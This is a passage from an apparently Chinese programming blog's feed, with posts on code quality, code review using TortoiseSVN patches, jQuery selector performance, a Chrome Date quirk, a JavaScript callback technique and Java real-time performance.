&lt;p style=&quot;line-height: 1.8; margin: 0px 0px 10px; padding: 0px;&quot;&gt;&lt;span style=&quot;font-size: x-small;&quot;&gt;&lt;br style=&quot;margin: 0px; padding: 0px;&quot; /&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p style=&quot;line-height: 1.8; margin: 0px 0px 10px; padding: 0px;&quot;&gt;&lt;span style=&quot;font-size: x-small;&quot;&gt;然而，程序员们可以用新的Sikuli应用创建脚本，来对应用程序的GUI组件进行自动化测试。计算机视觉辨别GUI和那些应该被弹出的窗口使得脚本编写容易多了，并且只要写一次，这些脚本就可以不做修改的每天晚上运行。&lt;/span&gt;&lt;/p&gt;
&lt;p style=&quot;line-height: 1.8; margin: 0px 0px 10px; padding: 0px;&quot;&gt;&lt;span style=&quot;font-size: x-small;&quot;&gt;&lt;br style=&quot;margin: 0px; padding: 0px;&quot; /&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p style=&quot;line-height: 1.8; margin: 0px 0px 10px; padding: 0px;&quot;&gt;&lt;span style=&quot;font-size: x-small;&quot;&gt;这个新的应用有一个新加的功能，对于那些非程序员来说尤其令人鼓舞。像它的前任一样，他允许用户写他们自己的脚本--这种情况下，GUI测试--使用Python语言。当然，用Python写脚本仍然需要一些Python的知识--至少，理解怎么使用像&quot;dragDrop&quot;和&quot;assertNotExist&quot;这样表述怎么处理GUI控件的命令。&lt;/span&gt;&lt;/p&gt;
&lt;p style=&quot;line-height: 1.8; margin: 0px 0px 10px; padding: 0px;&quot;&gt;&lt;span style=&quot;font-size: x-small;&quot;&gt;&lt;br style=&quot;margin: 0px; padding: 0px;&quot; /&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p style=&quot;line-height: 1.8; margin: 0px 0px 10px; padding: 0px;&quot;&gt;&lt;span style=&quot;font-size: x-small;&quot;&gt;新的应用同时提供了另一种选择，可以通过记录一系列按键和点击鼠标来定义测试过程。例如，代替敲打一行包括&quot;dragDrop&quot;命令的代码，程序员可以简单的做拖拽文件这样一个动作。系统自动的生成相应的Python代码，包含一个同样文件的截图；只要这个程序员愿意，她就可以当插入其他GUI的截图时复用这些代码。这指明使用Sikuli将来的版本也许既不需要了解特殊应用程序的代码知识，也不需要学习像Python这样的脚本语言，这个系统赋予了普通计算机用户直观的创建程序的能力，这些程序可以跟其他的应用进行交互。&lt;/span&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>代码质量系列之三：盒子外面看世界，技术之外的思考——关于沟通</title>
   <link href="http://hackfisher.github.com/blog/2011/01/out-of-box-communication"/>
   <updated>2011-01-16T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2011/01/out-of-box-communication</id>
   <content type="html">&lt;span style=&quot;font-family: Arial;&quot;&gt;一直以来，很多尝试解决代码质量的思路都是从技术角度出发，也许技术出身的原因，思维一直局限于这个盒子里面。&lt;/span&gt;&lt;span style=&quot;font-family: Arial;&quot;&gt;突然想到也许代码质量这个问题的解决思路不在这个盒子里面，需要在盒子外面看这个世界。&lt;/span&gt;

&lt;span style=&quot;font-family: Arial;&quot;&gt;上网玩微博的时候在想，问题会不会出在沟通上面？比如遇到一个问题，两个人讨论一确定了某个API或者最佳实践，就Over了，其他人也不知道，结果又造了个轮子，或者用垃圾的代码实现，这是一个沟通问题。&lt;/span&gt;&lt;span style=&quot;font-family: Arial;&quot;&gt;还有一个，经常感觉有这样一种印象，好像代码质量是某一个人的事，而不是大家的事情，每个人都愿意并且乐意代码质量进行沟通，而不是一种感觉很严苛的纠错的别扭气氛，可以轻松一点。&lt;/span&gt;

&lt;span style=&quot;font-family: Arial;&quot;&gt;《人月神话》里提到的巴比伦塔的故事：&lt;/span&gt;

&lt;span style=&quot;font-family: Arial;&quot;&gt;&lt;strong&gt;现在整个大地都采用一种语言，只包括为数不多的单词。在一次从东方往西方迁徙的过程中，人们发现了苏美尔地区，并在那里定居下来。接着他们奔走相告说：&quot;来，让我们制造砖块，并把它们烧好。&quot;于是，他们用砖块代替石头，用沥青代替灰泥（建造房屋）。然后，他们又说：&quot;来，让我们建造一座带有高塔的城市，这个塔将高达云宵，也将让我们声名远扬，同时，有了这个城市，我们就可以聚居在这里，再也不会分散在广阔的大地上了。&quot;于是上帝决定下来看看人们建造的城市和高塔，看了以后，他说：&quot;他们只是一个种族，使用一种的语言，如果他们一开始就能建造城市和高塔，那以后就没有什么难得倒他们了。来，让我们下去，在他们的语言里制造些混淆，让他们相互之间不能听懂。&quot;这样，上帝把人们分散到世界各地，于是他们不得不停止建造那座城市。（创世纪，11:1-8）&lt;/strong&gt;&lt;/span&gt;

&lt;span style=&quot;font-family: Arial;&quot;&gt;沟通，团队知识共享共同提升。有时候&lt;/span&gt;&lt;span style=&quot;font-family: Arial;&quot;&gt;不一定是谁不重视代码质量的问题，只是对于该怎么编程，写代码，一个认为应该这样，另一个认为应该那样，其他人没有考虑过这个问题，下次又要重复讨论一次。&lt;/span&gt;&lt;span style=&quot;font-family: Arial;&quot;&gt;这种情况需要经过彻底的交流讨论，也许要经过很长时间，很多次的沟通。沟通也是XP的思想精髓之一吧。&lt;/span&gt;

&lt;span style=&quot;font-family: Arial;&quot;&gt;基于上面简单的想法，想到的一个可行办法，其实也没什么新意，就是增加一个邮件列表，专门用来讨论代码质量相关的话题。&lt;/span&gt;&lt;span style=&quot;font-family: Arial;&quot;&gt;这样，每个人遇到代码的，或者开发上面的问题，或者发布讨论一个API，可以简单的发一个邮件到这个邮件列表，其他人会很乐意回复讨论这个邮件，所有人都可以从里学到东西，所有人都可以求助发问讨论。讨论的内容不一定是代码质量问题，只要是技术代码的东西，都可以拿出来讨论，包括遇到一个问题不知道怎么解决，可以发邮件求助。 新人来了，看到其他人遇到类似问题，就直接学会了，避免就一个问题进行很多次重复的沟通。&lt;/span&gt;

&lt;span style=&quot;font-family: Arial;&quot;&gt;
想要的就是这样一个高质量邮件列表，对每个人都有帮助，能够帮助提高代码质量。至少，每个人每天都会看邮件。至于怎么保证这个邮件列表的高质量，这才是代码质量管理者应该做的事情。&lt;/span&gt;

也许有其他的办法，比如最近看到新浪在推的所谓企业微博。说到沟通效率，目前来说应该是微博的效率最高了，但是微博的话题感觉是围绕主体(参与的人)展开，发送一句话，相关的其他人都能收到，其实邮件列表也有相同的功能，发送一个邮件列表，组里的所有人都能收到，更多的是围绕一个团队。另外，邮件列表式的讨论一般都是围绕一个主题，容易让讨论深入。这种古老的方式自从有编程活动开始，一直存在至今(像Google Group，很多开源软件开发团队一直使用)，我想一定有其背后的道理吧。
</content>
 </entry>
 
 <entry>
   <title>2011年1月8日于南京中山陵</title>
   <link href="http://hackfisher.github.com/blog/2011/01/nanjing-sun-yat-sen"/>
   <updated>2011-01-16T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2011/01/nanjing-sun-yat-sen</id>
   <content type="html">&lt;p style=&quot;text-align: center;&quot;&gt;&lt;strong&gt;天下为公&lt;/strong&gt;&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/uploads/2011/01/IMG_1251.jpg&quot; alt=&quot;IMG_1251.JPG&quot; width=&quot;800&quot; height=&quot;600&quot; /&gt;&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;strong&gt;墓顶的青天白日旗&lt;/strong&gt;&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/uploads/2011/01/IMG_1255.jpg&quot; alt=&quot;IMG_1255.JPG&quot; width=&quot;800&quot; height=&quot;600&quot; /&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>代码质量系列之二：如何利用TortoiseSVN的CreatePatch功能进行CodeReview</title>
   <link href="http://hackfisher.github.com/blog/2011/01/tortoisesvn-create-patch-codereview"/>
   <updated>2011-01-07T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2011/01/tortoisesvn-create-patch-codereview</id>
   <content type="html">上次的代码质量系列之一讨论&lt;a title=&quot;什么是代码质量&quot; href=&quot;http://fisher.leehoan.com/wp/?p=46&quot; target=&quot;_blank&quot;&gt;什么是代码质量&lt;/a&gt;？

在这片文章中将会介绍提升团队代码质量的管理手段之一CodeReview，以及一些简单具体的实践办法。

在IBM、微软等非常多公司都有一个非常好的实践，那就是Code Review - 代码复审。这种代码审查的过程，不是将代码发给某一个人或某几个人去看，而是强调程式员自己定期走上台，向其他人讲解自己源程式的活动。因为要向大家讲解自己的程式，show code to other guys, 程式员会极其重视自己的工作进度、代码质量，在写代码时，就时刻想着可能随时会被选中去做code review, 所以非常认真对待每一行代码。这种Code review 方式更有其他好处。

目前我在的团队所进行的CodeReview还仅仅局限于资深程序员对新手的代码质量检查，主要目的有两个，一个是为了提升新手的代码质量水平，其次就是为了保证代码基不会被新手的低质量代码污染，要改进的地方还有很多。我个人认为前者要更重要一些，可以通过讨论交流，相互学习和传播产品技术知识来实现。我工作中很重要的一部分就是进行CodeReview，已经进行了一段时间了，我们实践并没有采用什么复杂的CodeReview工具，仅采用了Tortoise SVN的create patch，TortoiseUDiff和TortoiseMerge几个工具就可以搞定。除此之外就只利用Google的CodePro工具做一些代码Audit工作。

1.create patch
使用create patch可以生成一个或者多个修改过的文件和当前版本差异的patch（支持目录树）
通常情况下，create patch将修改保存为.patch或.diff文件
可以将.patch或.diff文件的内容复制出来，发给需要审查的人
.patch或.diff文件中记录了发生这个patch的版本号以及具体修改的内容
针对某个文件或某几个文件的若干种修改，可以生成多个.patch或.diff文件

&lt;img src=&quot;/uploads/2011/01/create_patch_0001.png&quot; alt=&quot;create_patch.png&quot; width=&quot;605&quot; height=&quot;360&quot; /&gt;
2.apply patch
可以将.patch或.diff文件应用到对应版本的项目，就像打补丁一样
同一个项目/文件夹下，可以选择应用需要的patch
通常来说，应用一个patch时文件版本和生成这个patch时文件的版本是一致的；如果不一致，也可以强制应用，svn会自动进行diff（这时候需要手动合并）
linux下，可以使用系统的patch命令来应用patch，eg: patch -p0 &amp;lt;xxx.patch

&lt;img src=&quot;/uploads/2011/01/diff_0001.png&quot; alt=&quot;diff.png&quot; width=&quot;1021&quot; height=&quot;245&quot; /&gt;

3. TortoiseMerge工具操作

Window默认可在安装目录的bin目录下找到此工具

&lt;img src=&quot;/uploads/2011/01/merge_0001.png&quot; alt=&quot;merge.png&quot; width=&quot;494&quot; height=&quot;372&quot; /&gt;
4.使用
暂时不需要提交或不允许提交的修改，可以选择create patch来保存修改的内容
选择create patch来保存修改的内容并且提交patch，通过审查后，(在服务器端)应用patch
当一个功能有多种解决方案时，可以生成多个patch，（提交后）分别经过测试，再决定应用哪个patch
多个功能分别需要改同一个文件的不同地方（即没有同一行），可以做成多个patch，应用patch的顺序没有要求（在linux下应用也一样成功，只是会生成多个.orig文件）
多个连续性的功能，他们修改的文件都与一个base作patch，例：p1在v1的基础上开发v2，生成v2和v1之间的patch1；p2在v2的基础上开发v3，生成v3和v1之间的patch2，这样只要应用patch2也就应用了patch1。
</content>
 </entry>
 
 <entry>
   <title>代码质量系列之一：什么是代码质量?</title>
   <link href="http://hackfisher.github.com/blog/2011/01/what-is-code-quality"/>
   <updated>2011-01-05T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2011/01/what-is-code-quality</id>
   <content type="html">最近整天讨论代码质量，到底&quot;代码质量&quot;是什么，它为什么这么重要？搞不清楚它的意义，会让我们有时候觉得这个话题不仅大，而且空洞。

我的理解：什么是代码质量?
讨论代码质量前，先说说什么是质量？&lt;a href=&quot;http://www.google.com/url?sa=D&amp;amp;q=http://baike.baidu.com/view/13930.htm?fr=ala0_1#6&quot; target=&quot;_blank&quot;&gt;百度百科&lt;/a&gt;说：质量是产品或服务的总体特征和特性，基于此能力来满足明确或隐含的需要。

简而言之，质量是满足需求的能力。软件质量是满足软件客户需求的能力。同样的，代码质量也是满足一种需求的能力，这里的需求来源不仅包括客户，也包括程序员，还包括测试人员。

有人会问你们程序员还要什么需求？

Alice: 客户是上帝，你们程序员又不是。Bob: 可我曾听一个程序员说，他编写代码有时能体会到上帝造物的感觉，真是神奇，鬼TM才信。

其一，用户的需求变动或者增加，程序员需要改动代码，是看的懂还是看不懂，是容易改还是不容易改，&quot;看的懂容易改&quot;就是程序员的需求。这种需求虽然对软件质量没有直接的影响，但是会造成将来的时间人力成本，也可以理解为增加了一种债务。
高质量的代码有好的结构，可以大大降低代码的复杂度，易于维护和测试。高质量的代码清晰易懂。高质量的代码可变更性强。

其二，如果实现软件的代码跟客户需求不对应，从而不能满足上帝客户的需求，实际上就对软件的质量造成了影响，肯定不算是高质量。所以说，代码质量是软件质量的组成部分。开发人员代码质量越高，BUG就会越少，即使有BUG也容易找到；反之代码质量&lt;a href=&quot;http://www.google.com/url?sa=D&amp;amp;q=http://www.alisdn.com/wordpress/?p=258&quot; target=&quot;_blank&quot;&gt;越低&lt;/a&gt;，BUG就会越多(据不可靠数据，50%的Bug直接或间接因为低质量代码造成的)。

软件质量不好迟早有一天会被用户抛弃，同样的，代码质量不好迟早有一天会被它的需求来源抛弃，最惨的状况是，自己被自己的代码抛弃，陷入无法自拔 复杂泥潭。
</content>
 </entry>
 
 <entry>
   <title>JQuery选择器性能分析</title>
   <link href="http://hackfisher.github.com/blog/2011/01/jquery-performance-profile"/>
   <updated>2011-01-05T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2011/01/jquery-performance-profile</id>
   <content type="html">关于&lt;a title=&quot;JQuery选择器&quot; href=&quot;http://api.jquery.com/category/selectors/&quot; target=&quot;_blank&quot;&gt;JQuery选择器&lt;/a&gt;，有很多介绍其&lt;a title=&quot;性能影响&quot; href=&quot;http://www.artzstudio.com/2009/04/jquery-performance-rules/&quot; target=&quot;_blank&quot;&gt;性能影响&lt;/a&gt;的好文章，但因为一直没有遇到，知其然不知其所以然，所以一直没有十分关注，最近刚好碰到了一个严重的性能问题，经过分析，才使我意识到了JQuery选择器性能的重要性，看来东西还是要亲自实践一把，才能理解透彻。

我在一个页面里面用到了多个Table，每个table里面会有很多td格子，多的时候能达到上千个。实现的是一个客户端浏览器自动重新计算公式的功能，我发现并没有要取很多格子的值，却十分的慢，特别是IE下面。我发现公式计算中有很多的冗余计算，首先我先把公式的冗余计算问题解决，FF没问题，但是IE中还是有一点顿的感觉。于是第二次，我打算profile一下，看看还有哪些可以优化的点，一般来说，当你决定进一步深入研究时，总有意外的收获在等着你。

感谢firebug的概况功能，能让我通过profile获得性能初步的宝贵信息，截图如下，可以发现ID()方法和filter()方法，占用了超过70%的时间，而这两个方法都是$('#A1-0', $table)惹的祸，这样一个选择器，大概也就只需要选择不到100次，怎么这个ID方法调用却超过4万次？

&lt;img src=&quot;http://hackfisher.info/uploads/2011/01/jquery_profile.png&quot; alt=&quot;点击查看原始尺寸&quot; width=&quot;640&quot; height=&quot;204&quot; border=&quot;0&quot; /&gt;

点进ID方法，查看调用栈，如下：

ID: function(elem, match){
return elem.nodeType === 1 &amp;amp;&amp;amp; elem.getAttribute(&quot;id&quot;) === match;
},

&lt;img src=&quot;http://hackfisher.info/uploads/2011/01/jquery_stack.png&quot; alt=&quot;&quot; width=&quot;168&quot; height=&quot;129&quot; border=&quot;0&quot; /&gt;

可以看到ID方法和filter方法是一伙的，有希望一起搞定，点进filter方法，想要有所收获，你要有福尔摩斯般的嗅觉，善于发现蛛丝马迹，你发现了什么？

&lt;img src=&quot;http://hackfisher.info/uploads/2011/01/jquery_code.png&quot; alt=&quot;&quot; width=&quot;607&quot; height=&quot;271&quot; border=&quot;0&quot; /&gt;

没错，当前调用是在filter方法的一个循环里，你突然就会奇怪，哎，我只不过是想在$table里面拿一个id是A1-0的td罢了，$('#A1-0', $table)直接取不就行了，为什么还要遍历560多个元素，JQuery的那些大牛不会不知道吧。你转念一想如果是你自己来实现这个功能，通过id取元素的办法只有getElementByID，但是这个方法只有document对象能调用，如果调用的化我怎么判断这个元素$table里面，很遗憾我没有找到办法。而且如果document里面有有多个id为A1-0的td，那么$('#A1-0')和document.getElementById('A1-0')只能选择第一个，我觉得这是DOM设计上的缺陷，凭啥不能有诸如$table[0].getElementById的方法？

很可惜，没有，所以Jquery那些大牛面对$('#A1-0', $table)也只能遍历所有元素。

结论：$(&quot;#A1-0&quot;)的性能要大大好于$('#A1-0', $table)或者$('td#A1-0')，最理想的办法，保证同一个document即使多个table(比如有参数面板)，td的id也能保持唯一性，这样就可以用$(&quot;#A1-0&quot;)，而不需要担心不唯一性，导致必须用$('#A1-0', $table)。
</content>
 </entry>
 
 <entry>
   <title>Chrome浏览器Date.setDate遇到的一个问题</title>
   <link href="http://hackfisher.github.com/blog/2011/01/chrome-date-setdate-problem"/>
   <updated>2011-01-05T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2011/01/chrome-date-setdate-problem</id>
   <content type="html">在Chrome中，下面这段代码竟然是有问题的！

var a = 0; var dat = new Date(); dat.setDate(-a);

改成下面这样就没问题了，有个日期控件似乎就是因为这个原因

var a = 0; var dat = new Date(); dat.setDate(0-a);
另外，参考下这个： &lt;a href=&quot;http://www.dynarch.com/projects/calendar/download/1.8/&quot; target=&quot;_blank&quot;&gt;http://www.dynarch.com/projects/calendar/download/1.8/&lt;/a&gt;
</content>
 </entry>
 
 <entry>
   <title>B/S交互数据时，用户自定义回调函数的一种直观方法</title>
   <link href="http://hackfisher.github.com/blog/2011/01/b_s-user-defined-callback"/>
   <updated>2011-01-05T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2011/01/b_s-user-defined-callback</id>
   <content type="html">在js中经常有各种各样的回调函数，可以让用户自定义内容，比如：

1 dosomething({
2 callback: function(res) {
3 // content
4 alert('hello world' + res)
5 }
6 })

在一个框架中，这些callback的形参往往是框架已经定义好的，调用也是由框架负责， 框架的用户唯一能做的就是改变callback函数的内容。

有时，content的数据需要由服务器生成，比如{arg1: 1, arg2, 2}是由服务器生成的，用户定义这个callback行为时并不知道这些参数的值，只知道参数的名arg1, arg2, 用户希望可以直观舒服的定义，既能取到arg1, arg2, 又能取到res,能适应不同的callback，像下面这样：

1 function(arg1, arg2, res, status) {
2 alert(arg1 + res);// 用户能定义的内容
3 }

前面已经说过，callback的形参定义和调用用户都无法介入，那怎么样才能做到这样呢?方法总是有的，下面是一种解决方案，大体的思路就是利用closure取到callback实参的值，同时将callback的实参嵌入用户定义的函数来保持arguments和形参形式的统一。Callback的形式：

1 function(res, status){${jsImpl}}

这是用户定义的代码：

1 function(arg1, arg2, res, status) {
2 // user defined
3 }()

用下面这段代码替换${jsImpl}, 其中arg1, arg2和[1, 2]是服务器端生成的：

1 ;return (
2 function(arg1, arg2) {
3 ${userDefined}
4 }
5 )
6 .createDelegate(this, [1, 2], true)
7 .apply(this, arguments)

整个的替换后就是：

01 (function(res){
02 ;return
03 (function(arg1, arg2, arg3){//abc, 1, 2
04 alert(arguments[0]);
05 alert(arguments[1]);
06 alert(arguments[2]);
07 alert(res);
08 alert(arg1);
09 alert(arg2);
10 alert(arg3);
11 })
12 .createDelegate(this, [1, 2], 0)
13 .apply(this, arguments)
14 })
15 .apply(window, [&quot;abc&quot;])

有人可能会问，如果只是要取到callback参数的值为什么不简单一点：

01 (function(res){
02 //...
03 ;return
04 (function(arg1, arg2, arg3){//abc, 1, 2
05 alert(arguments[0]);
06 alert(arguments[1]);
07 alert(arguments[2]);
08 alert(res);
09 alert(arg1);
10 alert(arg2);
11 alert(arg3);
12 }).call(this, 1, 2);
13 })
14 .apply(window, [&quot;abc&quot;])

不这样的原因，主要是形参和arguments形式上就不统一了，以防有人用arguments取参数值，谈到arguments, 这边还要注意如果是取原来callback的第i个参数的话，需要加上形参的个数arguments[2+i]，2为用户自定义的形参个数。

PS: createDelegate请看&lt;a href=&quot;http://www.extjs.com/learn/Manual:Utilities:Function_(Chinese)&quot; target=&quot;_blank&quot;&gt;http://www.extjs.com/learn/Manual:Utilities:Function_(Chinese)&lt;/a&gt;
</content>
 </entry>
 
 <entry>
   <title>Java性能优化之实时性[3]</title>
   <link href="http://hackfisher.github.com/blog/2009/05/java-performance-3"/>
   <updated>2009-05-10T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2009/05/java-performance-3</id>
   <content type="html">&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;——万事开头难&lt;/span&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-family: 'Trebuchet MS'; font-weight: bold; line-height: 22px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;&lt;a href=&quot;http://yangtsefisher.blogspot.com/2009/05/test-code.html&quot;&gt;Java性能优化之实战漫谈[1]&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-family: 'Trebuchet MS'; font-size: 20px; font-weight: bold; line-height: 22px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;&lt;a href=&quot;http://yangtsefisher.blogspot.com/2009/05/java-performance-tuning-algorithm-2.html&quot;&gt;Java性能优化之实战算法[2]&lt;/a&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: 13px;&quot;&gt;
&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;如果你的应用程序能够满足内存和速度的要求，有时还是不够的，对于某些应用程序来说，尤其是实时系统，它还必须满足良好的用户体验，这就要求你的程序能够做到好的实时性。&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;关于用户体验，有很多心理学的研究。如果你了解用户懒惰和缺乏耐心等心理，你也许会更加明白，实时性有时会如此重要。相关的文章比如&lt;/span&gt;&lt;a href=&quot;http://www.ruanyifeng.com/blog/2009/03/the_psychology_of_web_performance.html&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;网站打开速度的心理学&lt;/span&gt;&lt;/a&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;，&lt;/span&gt;&lt;a href=&quot;http://lifesinger.org/blog/?p=1576&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;人之初，性本懒&lt;/span&gt;&lt;/a&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt; 等等。但是实时性的要求也不局限于用户体验，有许多被称之为&lt;/span&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 22px; font-family: verdana;&quot;&gt;&lt;em style=&quot;font-style: normal;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;硬&lt;/span&gt;&lt;/em&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt; RT 应用的程序要求必须严格地满足实时同步需求，比如控制飞机方向的应用程序不能够有任何原因的延迟，否则将导致灾难性的后果。&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 22px; font-family: verdana;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;由于很多重要原因，Java 语言在实时系统中的应用非常有限，导致Java写出来的应用程序有时实时性很差。这些原因包括 Java 语言设计中固有的不确定性性能影响，例如动态类加载，以及 Java 运行时环境（Java Runtime Environment，JRE）本身的不确定性性能影响，例如垃圾收集器和本地代码编译。&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 22px; font-family: verdana;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 22px; font-family: verdana;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;当然，为了解决这些问题，使得Java能够用来构建实时系统，一些规范应运而生，比如&lt;/span&gt;&lt;a href=&quot;http://www.rtsj.org/&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;RTSJ&lt;/span&gt;&lt;/a&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;。关于实时系统和RTSJ，可以参照文章：&lt;/span&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 18px; font-family: 'Microsoft yahei';&quot;&gt;&lt;a href=&quot;http://www.ibm.com/developerworks/cn/java/j-rtj1/index.html&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;实时 Java: 使用 Java 语言编写实时系统&lt;/span&gt;&lt;/a&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;或者&lt;/span&gt;&lt;a href=&quot;http://blog.csdn.net/hdy007/archive/2007/05/12/1605856.aspx&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;这里的转载&lt;/span&gt;&lt;/a&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;。我这里不再赘述。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 18px; font-family: 'Microsoft yahei';&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 18px; font-family: 'Microsoft yahei';&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;我主要讲一下我碰到的一个例子: 在某些Swing应用程序中发现，做某些操作时，第一次总是比较慢，以后就好了，有时候时间相差一个数量级，导致使用起来达不到正常的用户RT需求，用户就不高兴了，这正是没有满足用户缺乏耐心的需求，可以说是软障碍。为什么第一次总是比较慢呢，第一次新建慢，第一次编辑慢，第一次弹出某个对话框也慢？这真是奇怪。我之所以出现这样的困惑，其实是因为那时候我还不理解类加载和本地代码编译的具体细节。&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 18px; font-family: 'Microsoft yahei';&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;在运行时，当我们想生成这个类的对象时，JVM首先检查这个类的Class对象是否已经加载。如果尚未加载，JVM就会根据类名查找.class文件，并将其载入内存。&lt;/span&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 22px; font-family: verdana;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;一个与 Java 一致的 JVM 必须延迟加载类，直到程序第一次引用该类。根据被加载类所在的介质（磁盘或其他）的速度、类的大小、类加载器本身的开销，类加载的时间有所不同。加载类的延迟通常高达 10 毫秒。如果需要加载几十或几百个类，则加载时间本身就会引起很长时间的意外延迟。仔细地设计应用程序，使应用程序在启动时加载所有的类，但是这必须手动完成，因为 Java 语言规范不让 JVM 提前执行这一步。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 22px; font-family: verdana;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 22px; font-family: verdana;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;再让我们来看看编译：将 Java 代码编译为本地代码引发了与类加载类似的问题。大多数现代 JVM 开始先解释 Java 方法，然后仅将频繁执行的方法编译成本地代码。延迟编译促成了快速启动，并减少了应用程序运行期间执行的编译数量。但是使用解释后的代码执行任务和使用编译后的代码执行任务在时间上有巨大的差异。对于硬 RT 应用程序来说，由于无法预测何时发生编译，将导致很大程度的不确定性，从而无法有效地规划应用程序的行为。对于类加载，通过在应用程序启动阶段使用 &lt;/span&gt;&lt;code style=&quot;font-style: normal;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;Compiler&lt;/span&gt;&lt;/code&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt; 